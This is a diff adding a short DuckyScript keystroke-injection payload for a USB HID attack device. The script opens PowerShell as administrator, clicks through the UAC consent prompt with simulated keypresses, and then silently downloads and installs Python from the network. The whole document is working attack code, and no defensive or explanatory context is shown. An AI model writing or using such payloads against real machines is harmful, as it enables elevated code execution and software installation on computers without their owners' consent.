@@ -1,0 +1,11 @@
+GUI r
+BACKSPACE
+DELAY 500
+STRING Powershell
+CTRL-SHIFT ENTER
+DELAY 1000
+LEFTARROW
+ENTER
+DELAY 1000
+STRING (Get-Command "python.exe" -ErrorAction SilentlyContinue | ForEach-Object { (& $_.Source --version) -like "*Python*" }) -or (& { Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.10.5/python-3.10.5-amd64.exe" -OutFile "$env:Temp\python-installer.exe"; Start-Process -FilePath "$env:Temp\python-installer.exe" -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait })
+ENTER
